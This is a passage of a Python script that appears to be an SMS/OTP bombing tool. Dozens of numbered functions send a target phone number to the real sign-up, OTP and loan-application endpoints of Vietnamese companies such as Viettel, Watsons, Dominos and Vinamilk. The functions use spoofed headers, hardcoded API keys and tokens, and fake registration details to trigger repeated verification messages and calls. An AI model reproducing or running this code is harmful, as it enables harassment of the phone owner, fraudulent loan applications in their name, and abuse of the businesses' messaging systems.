        requests.post("https://mobile.useinsider.com/api/v3/session/start", data=payload1, headers=headers1, timeout=15)

        # Request 2
        payload2 = json.dumps({
            "phone_number": sdt,
            "email": "",
            "username": "",
            "ts": int(time.time()),
            "signature": "480518ec08912b650efe1eaa555c2c55e47d2be2b2c98600616de592b3cafc11"
        })
        headers2 = {
            'User-Agent': "appota_wallet_v2/119 CFNetwork/1474 Darwin/23.0.0",
            'Content-Type': "application/json",
            'client-version': "5.2.10",
            'aw-device-id': formatted_device_id,
            'language': "vi",
            'client-authorization': "GuVdXWzWPpwsB5EDNYuoJ1Er6OU1aSpP",
            'x-device-id': formatted_device_id,
            'x-client-build': "119",
            'x-client-version': "5.2.10",
            'platform': "ios",
            'accept-language': "vi-vn",
            'ref-client': "appwallet",
        }
        requests.post("https://api.gw.ewallet.appota.com/v2/users/check_valid_fields", data=payload2, headers=headers2, timeout=15)

        # Request 3
        payload3 = json.dumps({
            "phone_number": sdt,
            "sender": "SMS",
            "ts": int(time.time()),
            "signature": "5a17345149daf29d917de285cf0bf202457576b99c68132e158237f5caec85a5"
        })
        r = requests.post("https://api.gw.ewallet.appota.com/v2/users/register/get_verify_code", data=payload3, headers=headers2, timeout=15)
        print(f"[APPOTA] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[APPOTA] Lỗi: {e}")


# ============================================================
# 36. WATSONS
# ============================================================
def send_otp_via_Watsons(sdt):
    url = "https://www10.watsons.vn/api/v2/wtcvn/forms/mobileRegistrationForm/steps/wtcvn_mobileRegistrationForm_step1/validateAndPrepareNextStep"
    params = {'lang': "vi"}
    payload = json.dumps({
        "otpTokenRequest": {
            "action": "REGISTRATION",
            "type": "SMS",
            "countryCode": "84",
            "target": sdt
        },
        "defaultAddress": {"mobileNumberCountryCode": "84", "mobileNumber": sdt},
        "mobileNumber": sdt
    })
    headers = {
        'User-Agent': "WTCVN/24050.8.0 (iOS/17.0.2)",
        'Content-Type': "application/json",
        'accept-language': "vi",
        'x-app-version': "24050.8.0",
        'env': "prod",
    }
    try:
        r = requests.post(url, params=params, data=payload, headers=headers, timeout=15)
        print(f"[WATSONS] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[WATSONS] Lỗi: {e}")


# ============================================================
# 37. HOANGPHUC
# ============================================================
def send_otp_via_hoangphuc(sdt):
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://hoang-phuc.com',
        'referer': 'https://hoang-phuc.com/customer/account/create/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {'action_type': '1', 'tel': sdt}
    try:
        r = requests.post('https://hoang-phuc.com/advancedlogin/otp/sendotp/', headers=headers, data=data, timeout=15)
        print(f"[HOANGPHUC] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[HOANGPHUC] Lỗi: {e}")


# ============================================================
# 38. FM.COM.VN
# ============================================================
def send_otp_via_fmcomvn(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://fm.com.vn',
        'referer': 'https://fm.com.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-apikey': 'X2geZ7rDEDI73K1vqwEGStqGtR90JNJ0K4sQHIrbUI3YISlv',
        'x-fromweb': 'true',
        'x-requestid': generate_random_id2(),
    }
    json_data = {'Phone': sdt, 'LatOfMap': '106', 'LongOfMap': '108', 'Browser': ''}
    try:
        r = requests.post('https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2', headers=headers, json=json_data, timeout=15)
        print(f"[FM] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[FM] Lỗi: {e}")


# ============================================================
# 39. REEBOKVN
# ============================================================
def send_otp_via_Reebokvn(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'key': '63ea1845891e8995ecb2304b558cdeab',
        'origin': 'https://reebok.com.vn',
        'referer': 'https://reebok.com.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'timestamp': str(int(time.time() * 1000)),
    }
    json_data = {'phoneNumber': sdt}
    try:
        r = requests.post('https://reebok-api.hsv-tech.io/client/phone-verification/request-verification', headers=headers, json=json_data, timeout=15)
        print(f"[REEBOK] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[REEBOK] Lỗi: {e}")


# ============================================================
# 40. THEFACESHOP
# ============================================================
def send_otp_via_thefaceshop(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'key': 'c3ef5fcbab3e7ebd82794a39da791ff6',
        'origin': 'https://thefaceshop.com.vn',
        'referer': 'https://thefaceshop.com.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'timestamp': str(int(time.time() * 1000)),
    }
    json_data = {'phoneNumber': sdt}
    try:
        r = requests.post('https://tfs-api.hsv-tech.io/client/phone-verification/request-verification', headers=headers, json=json_data, timeout=15)
        print(f"[TFS] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[TFS] Lỗi: {e}")


# ============================================================
# 41. BEAUTYBOX
# ============================================================
def send_otp_via_BEAUTYBOX(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'key': 'ac41e98f028aa44aac947da26ceb7cff',
        'origin': 'https://beautybox.com.vn',
        'referer': 'https://beautybox.com.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'timestamp': str(int(time.time() * 1000)),
    }
    json_data = {'phoneNumber': sdt}
    try:
        r = requests.post('https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification', headers=headers, json=json_data, timeout=15)
        print(f"[BEAUTYBOX] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[BEAUTYBOX] Lỗi: {e}")


# ============================================================
# 42. WINMART (again)
# ============================================================
def send_otp_via_winmart(sdt):
    headers = {
        'accept': 'application/json',
        'content-type': 'application/json',
        'authorization': 'Bearer undefined',
        'origin': 'https://winmart.vn',
        'referer': 'https://winmart.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-api-merchant': 'WCM',
    }
    json_data = {
        'firstName': 'Nguyễn Quang Ngọc',
        'phoneNumber': sdt,
        'masanReferralCode': '',
        'dobDate': '2000-02-05',
        'gender': 'Male',
    }
    try:
        r = requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data, timeout=15)
        print(f"[WINMART2] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[WINMART2] Lỗi: {e}")


# ============================================================
# 43. FUTABUS
# ============================================================
def send_otp_via_futabus(sdt):
    headers = {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': 'https://futabus.vn',
        'referer': 'https://futabus.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-app-id': 'client',
    }
    json_data = {
        'phoneNumber': sdt,
        'deviceId': 'd46a74f1-09b9-4db6-b022-aaa9d87e11ed',
        'use_for': 'LOGIN',
    }
    try:
        r = requests.post('https://api.vato.vn/api/authenticate/request_code', headers=headers, json=json_data, timeout=15)
        print(f"[FUTABUS] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[FUTABUS] Lỗi: {e}")


# ============================================================
# 44. VIETTELPOST
# ============================================================
def send_otp_via_ViettelPost(sdt):
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'null',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    data = {
        'FormRegister.FullName': 'Nguyễn Quang Ngọc',
        'FormRegister.Phone': sdt,
        'FormRegister.Password': 'Test@123456',
        'FormRegister.ConfirmPassword': 'Test@123456',
        'ConfirmOtpType': 'Register',
        'FormRegister.IsRegisterFromPhone': 'true',
    }
    try:
        r = requests.post('https://id.viettelpost.vn/Account/SendOTPByPhone', headers=headers, data=data, timeout=15)
        print(f"[VIETTELPOST] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[VIETTELPOST] Lỗi: {e}")


# ============================================================
# 45. MYVIETTEL 2
# ============================================================
def send_otp_via_myviettel2(sdt):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/myviettel',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'X-Requested-With': 'XMLHttpRequest',
    }
    json_data = {'msisdn': sdt, 'type': 'register'}
    try:
        r = requests.post('https://viettel.vn/api/get-otp-contract-mobile', headers=headers, json=json_data, timeout=15)
        print(f"[MYVIETTEL2] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[MYVIETTEL2] Lỗi: {e}")


# ============================================================
# 46. MYVIETTEL 3
# ============================================================
def send_otp_via_myviettel3(sdt):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'X-Requested-With': 'XMLHttpRequest',
    }
    json_data = {'msisdn': sdt}
    try:
        r = requests.post('https://viettel.vn/api/get-otp', headers=headers, json=json_data, timeout=15)
        print(f"[MYVIETTEL3] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[MYVIETTEL3] Lỗi: {e}")


# ============================================================
# 47. TOKYOLIFE
# ============================================================
def send_otp_via_TOKYOLIFE(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://tokyolife.vn',
        'referer': 'https://tokyolife.vn/',
        'signature': 'c5b0d82fae6baaced6c7f383498dfeb5',
        'timestamp': str(int(time.time() * 1000)),
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    json_data = {
        'phone_number': sdt,
        'name': 'Nguyễn Quang Ngọc',
        'password': 'Test@123456',
        'email': 'test@example.com',
        'birthday': '2002-03-12',
        'gender': 'male',
    }
    try:
        r = requests.post('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', headers=headers, json=json_data, timeout=15)
        print(f"[TOKYOLIFE] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[TOKYOLIFE] Lỗi: {e}")


# ============================================================
# 48. 30SHINE
# ============================================================
def send_otp_via_30shine(sdt):
    headers = {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': 'https://30shine.com',
        'referer': 'https://30shine.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    json_data = {'phone': sdt}
    try:
        r = requests.post('https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send', headers=headers, json=json_data, timeout=15)
        print(f"[30SHINE] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[30SHINE] Lỗi: {e}")


# ============================================================
# 49. CATHAYLIFE
# ============================================================
def send_otp_via_Cathaylife(sdt):
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://www.cathaylife.com.vn',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'X-Requested-With': 'XMLHttpRequest',
    }
    data = {
        'memberMap': f'{{"userName":"test@example.com","password":"Test@123","birthday":"03/07/2001","certificateNumber":"034202008372","phone":"{sdt}","email":"test@example.com","LINK_FROM":"signUp2","memberID":"","CUSTOMER_NAME":"Nguyễn Quang Ngọc"}}',
        'OTP_TYPE': 'P',
        'LANGS': 'vi_VN',
    }
    try:
        r = requests.post('https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/reSendOTP', headers=headers, data=data, timeout=15)
        print(f"[CATHAY] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[CATHAY] Lỗi: {e}")


# ============================================================
# 50. DOMINOS
# ============================================================
def send_otp_via_dominos(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'dmn': 'DSNKFN',
        'origin': 'https://dominos.vn',
        'referer': 'https://dominos.vn/',
        'secret': 'bPG0upAJLk0gz/2W1baS2Q==',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    json_data = {
        'phone_number': sdt,
        'email': 'test@example.com',
        'type': 0,
        'is_register': True,
    }
    try:
        r = requests.post('https://dominos.vn/api/v1/users/send-otp', headers=headers, json=json_data, timeout=15)
        print(f"[DOMINOS] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[DOMINOS] Lỗi: {e}")


# ============================================================
# 51. VINAMILK
# ============================================================
def send_otp_via_vinamilk(sdt):
    headers = {
        'accept': '*/*',
        'content-type': 'text/plain;charset=UTF-8',
        'authorization': 'Bearer null',
        'origin': 'https://new.vinamilk.com.vn',
        'referer': 'https://new.vinamilk.com.vn/account/register',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    data = f'{{"type":"register","phone":"{sdt}"}}'
    try:
        r = requests.post('https://new.vinamilk.com.vn/api/account/getotp', headers=headers, data=data, timeout=15)
        print(f"[VINAMILK] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[VINAMILK] Lỗi: {e}")


# ============================================================
# 52. VIETLOAN 2
# ============================================================
def send_otp_via_vietloan2(sdt):
    headers = {
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://vietloan.vn',
        'referer': 'https://vietloan.vn/register',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {'phone': sdt, '_token': '0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU'}
    try:
        r = requests.post('https://vietloan.vn/register/phone-resend', headers=headers, data=data, timeout=15)
        print(f"[VIETLOAN2] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[VIETLOAN2] Lỗi: {e}")


# ============================================================
# 53. BATDONGSAN
# ============================================================
def send_otp_via_batdongsan(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'referer': 'https://batdongsan.com.vn/sellernet/internal-sign-up',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    params = {'phoneNumber': sdt}
    try:
        r = requests.get('https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister', params=params, headers=headers, timeout=15)
        print(f"[BATDONGSAN] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[BATDONGSAN] Lỗi: {e}")


# ============================================================
# 54. GUMAC
# ============================================================
def send_otp_via_GUMAC(sdt):
    headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Origin': 'https://gumac.vn',
        'Referer': 'https://gumac.vn/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    json_data = {'phone': sdt}
    try:
        r = requests.post('https://cms.gumac.vn/api/v1/customers/verify-phone-number', headers=headers, json=json_data, timeout=15)
        print(f"[GUMAC] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[GUMAC] Lỗi: {e}")


# ============================================================
# 55. MUTOSI
# ============================================================
def send_otp_via_mutosi(sdt):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
        'Content-Type': 'application/json',
        'Origin': 'https://mutosi.com',
        'Referer': 'https://mutosi.com/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    json_data = {
        'name': 'Hà Khải',
        'phone': sdt,
        'password': 'Test@123456',
        'confirm_password': 'Test@123456',
        'verify_otp': 0,
        'store_token': '226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
        'email': 'test@example.com',
        'birthday': '2006-02-13',
        'accept_the_terms': 1,
        'receive_promotion': 1,
    }
    try:
        r = requests.post('https://api-omni.mutosi.com/client/auth/register', headers=headers, json=json_data, timeout=15)
        print(f"[MUTOSI] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[MUTOSI] Lỗi: {e}")

def send_otp_via_mutosi1(sdt):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
        'Content-Type': 'application/json',
        'Origin': 'https://mutosi.com',
        'Referer': 'https://mutosi.com/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    json_data = {
        'phone': sdt,
        'token': '03AFcWeA4O6j16gs8gKD9Zvb-gkvoC-kBTVH1xtMZrMmjfODRDkXlTkAzqS6z0cT_96PI4W-sLoELf2xrLnCpN0YvCs3q90pa8Hq52u2dIqknP5o7ZY-5isVxiouDyBbtPsQEzaVdXm0KXmAYPn0K-wy1rKYSAQWm96AVyKwsoAlFoWpgFeTHt_-J8cGBmpWcVcmOPg-D4-EirZ5J1cAGs6UtmKW9PkVZRHHwqX-tIv59digmt-KuxGcytzrCiuGqv6Rk8H52tiVzyNTtQRg6JmLpxe7VCfXEqJarPiR15tcxoo1RamCtFMkwesLd39wHBDHxoyiUah0P4NLbqHU1KYISeKbGiuZKB2baetxWItDkfZ5RCWIt5vcXXeF0TF7EkTQt635L7r1wc4O4p1I-vwapHFcBoWSStMOdjQPIokkGGo9EE-APAfAtWQjZXc4H7W3Aaj0mTLpRpZBV0TE9BssughbVXkj5JtekaSOrjrqnU0tKeNOnGv25iCg11IplsxBSr846YvJxIJqhTvoY6qbpFZymJgFe53vwtJhRktA3jGEkCFRdpFmtw6IMbfgaFxGsrMb2wkl6armSvVyxx9YKRYkwNCezXzRghV8ZtLHzKwbFgA6ESFRoIHwDIRuup4Da2Bxq4f2351XamwzEQnha6ekDE2GJbTw',
        'source': 'web_consumers',
    }
    try:
        r = requests.post('https://api-omni.mutosi.com/client/auth/reset-password/send-phone', headers=headers, json=json_data, timeout=15)
        print(f"[MUTOSI2] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[MUTOSI2] Lỗi: {e}")


# ============================================================
# 56. VIETAIR
# ============================================================
def send_otp_via_vietair(sdt):
    referer_url = f'https://vietair.com.vn/khach-hang-than-quen/xac-nhan-otp-dang-ky?mobile={sdt}'
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://vietair.com.vn',
        'referer': referer_url,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {
        'op': 'PACKAGE_HTTP_POST',
        'path_ajax_post': '/service03/sms/get',
        'package_name': 'PK_FD_SMS_OTP',
        'object_name': 'INS',
        'P_MOBILE': sdt,
        'P_TYPE_ACTIVE_CODE': 'DANG_KY_NHAN_OTP',
    }
    try:
        r = requests.post('https://vietair.com.vn/Handler/CoreHandler.ashx', headers=headers, data=data, timeout=15)
        print(f"[VIETAIR] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[VIETAIR] Lỗi: {e}")


# ============================================================
# 57. FAHASA
# ============================================================
def send_otp_via_FAHASA(sdt):
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.fahasa.com',
        'referer': 'https://www.fahasa.com/customer/account/login',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {'phone': sdt}
    try:
        r = requests.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', headers=headers, data=data, timeout=15)
        print(f"[FAHASA] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[FAHASA] Lỗi: {e}")


# ============================================================
# 58. HOPINESS
# ============================================================
def send_otp_via_hopiness(sdt):
    headers = {
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://shopiness.vn',
        'Referer': 'https://shopiness.vn/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'X-Requested-With': 'XMLHttpRequest',
    }
    data = {
        'action': 'verify-registration-info',
        'phoneNumber': sdt,
        'refCode': '',
    }
    try:
        r = requests.post('https://shopiness.vn/ajax/user', headers=headers, data=data, timeout=15)
        print(f"[HOPINESS] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[HOPINESS] Lỗi: {e}")


# ============================================================
# 59. MOCHA35
# ============================================================
def send_otp_via_modcha35(sdt):
    url = "https://v2sslapimocha35.mocha.com.vn/ReengBackendBiz/genotp/v32"
    payload = f"clientType=ios&countryCode=VN&device=iPhone15%2C3&os_version=iOS_17.0.2&platform=ios&revision=11224&username={sdt}&version=1.28"
    headers = {
        'User-Agent': "mocha/1.28 (iPhone; iOS 17.0.2; Scale/3.00)",
        'Content-Type': "application/x-www-form-urlencoded",
        'uuid': "B4DD9661-2B0B-418F-B953-6AE71C0373EC",
        'APPNAME': "MC35",
        'countryCode': "VN",
        'languageCode': "vi",
        'Accept-Language': "vi-VN;q=1"
    }
    try:
        r = requests.post(url, data=payload, headers=headers, timeout=15)
        print(f"[MOCHA35] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[MOCHA35] Lỗi: {e}")


# ============================================================
# 60. BIBABO
# ============================================================
def send_otp_via_Bibabo(sdt):
    url = "https://one.bibabo.vn/api/v1/login/otp/createOtp"
    params = {'phone': sdt, 'reCaptchaToken': "undefined", 'appId': "7", 'version': "2"}
    headers = {
        'User-Agent': "bibabo/522 CFNetwork/1474 Darwin/23.0.0",
        'Accept': "application/json, text/plain, */*",
        'accept-language': "vi-VN,vi;q=0.9"
    }
    try:
        r = requests.get(url, params=params, headers=headers, timeout=15)
        print(f"[BIBABO] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[BIBABO] Lỗi: {e}")


# ============================================================
# 61. MOCA
# ============================================================
def send_otp_via_MOCA(sdt):
    url = "https://moca.vn/moca/v2/users/role"
    params = {'phoneNumber': sdt}
    headers = {
        'User-Agent': "Pass/2.10.156 (iPhone; iOS 17.0.2; Scale/3.00)",
        'device-token': "4ADAF544-AB6D-4B7F-985A-BF6DAEAA38EA",
        'x-requested-with': "XMLHttpRequest",
        'accept-language': "vi",
        'platform': "P_IOS-2.10.156",
    }
    try:
        r = requests.get(url, params=params, headers=headers, timeout=15)
        print(f"[MOCA] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[MOCA] Lỗi: {e}")


# ============================================================
# 62. PANTIO
# ============================================================
def send_otp_via_pantio(sdt):
    headers = {
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://pantio.vn',
        'referer': 'https://pantio.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    params = {'domain': 'pantiofashion.myharavan.com'}
    data = {'phoneNumber': sdt}
    try:
        r = requests.post('https://api.suplo.vn/v1/auth/customer/otp/sms/generate', params=params, headers=headers, data=data, timeout=15)
        print(f"[PANTIO] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[PANTIO] Lỗi: {e}")


# ============================================================
# 63. ROUTINE
# ============================================================
def send_otp_via_Routine(sdt):
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://routine.vn',
        'referer': 'https://routine.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {'telephone': sdt, 'isForgotPassword': '0'}
    try:
        r = requests.post('https://routine.vn/customer/otp/send/', headers=headers, data=data, timeout=15)
        print(f"[ROUTINE] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[ROUTINE] Lỗi: {e}")


# ============================================================
# 64. VAYVND
# ============================================================
def send_otp_via_vayvnd(sdt):
    headers = {
        'accept': 'application/json',
        'content-type': 'application/json; charset=utf-8',
        'origin': 'https://vayvnd.vn',
        'referer': 'https://vayvnd.vn/',
        'site-id': '3',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    json_data_1 = {
        'phone': sdt,
        'utm': [{'utm_source': 'leadbit', 'utm_medium': 'cpa'}],
        'cpaId': 2,
        'cpaLeadData': {'click_id': '66A8D2827EED7B49190B756A', 'utm_campaign': '44559'},
        'sourceSite': 3,
        'regScreenResolution': {'width': 1920, 'height': 1080},
        'trackingId': 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
    }
    try:
        requests.post('https://api.vayvnd.vn/v2/users', headers=headers, json=json_data_1, timeout=15)
        json_data_2 = {
            'login': sdt,
            'trackingId': 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
        }
        r = requests.post('https://api.vayvnd.vn/v2/users/password-reset', headers=headers, json=json_data_2, timeout=15)
        print(f"[VAYVND] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[VAYVND] Lỗi: {e}")


# ============================================================
# 65. TIMA
# ============================================================
def send_otp_via_tima(sdt):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://tima.vn',
        'referer': 'https://tima.vn/vay-tien-online/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    data = {
        'application_full_name': generate_random_name(),
        'application_mobile_phone': sdt,
        'CityId': '1',
        'DistrictId': '16',
        'rules': 'true',
        'TypeTime': '1',
        'application_amount': '0',
        'application_term': '0',
        'UsertAgent': 'Mozilla/5.0',
        'IsApply': '1',
        'ProvinceName': 'Thành phố Hà Nội',
        'DistrictName': 'Huyện Sóc Sơn',
        'product_id': '2',
    }
    try:
        r = requests.post('https://tima.vn/Borrower/RegisterLoanCreditFast', headers=headers, data=data, timeout=15)
        print(f"[TIMA] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[TIMA] Lỗi: {e}")


# ============================================================
# 66. MONEYGO
# ============================================================
def send_otp_via_moneygo(sdt):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://moneygo.vn',
        'referer': 'https://moneygo.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    data = {
        '_token': 'X7pFLFlcnTEmsfjHE5kcPA1KQyhxf6qqL6uYtWCV',
        'total': '56688000',
        'phone': sdt,
        'agree': '1',
    }
    try:
        r = requests.post('https://moneygo.vn/dang-ki-vay-nhanh', headers=headers, data=data, timeout=15)
        print(f"[MONEYGO] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[MONEYGO] Lỗi: {e}")


# ============================================================
# 67. TAKOMO
# ============================================================
def send_otp_via_takomo(sdt):
    headers_post = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://lk.takomo.vn',
        'referer': 'https://lk.takomo.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    json_data = {
        'data': {'phone': sdt, 'code': 'resend', 'channel': 'ivr'},
    }
    try:
        r = requests.post('https://lk.takomo.vn/api/4/client/otp/send', headers=headers_post, json=json_data, timeout=15)
        print(f"[TAKOMO] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[TAKOMO] Lỗi: {e}")


# ============================================================
# 68. PAYNET
# ============================================================
def send_otp_via_paynet(sdt):
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://merchant.paynetone.vn',
        'Referer': 'https://merchant.paynetone.vn/User/Create',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'X-Requested-With': 'XMLHttpRequest',
    }
    data = {'MobileNumber': sdt, 'IsForget': 'N'}
    try:
        r = requests.post('https://merchant.paynetone.vn/User/GetOTP', headers=headers, data=data, timeout=15, verify=False)
        print(f"[PAYNET] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[PAYNET] Lỗi: {e}")


# ============================================================
# 69. PICO
# ============================================================
def send_otp_via_pico(sdt):
    headers1 = {
        'accept': '*/*',
        'content-type': 'application/json',
        'origin': 'https://pico.vn',
        'referer': 'https://pico.vn/',
        'region-code': 'MB',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    json_data_1 = {
        'name': generate_random_name(),
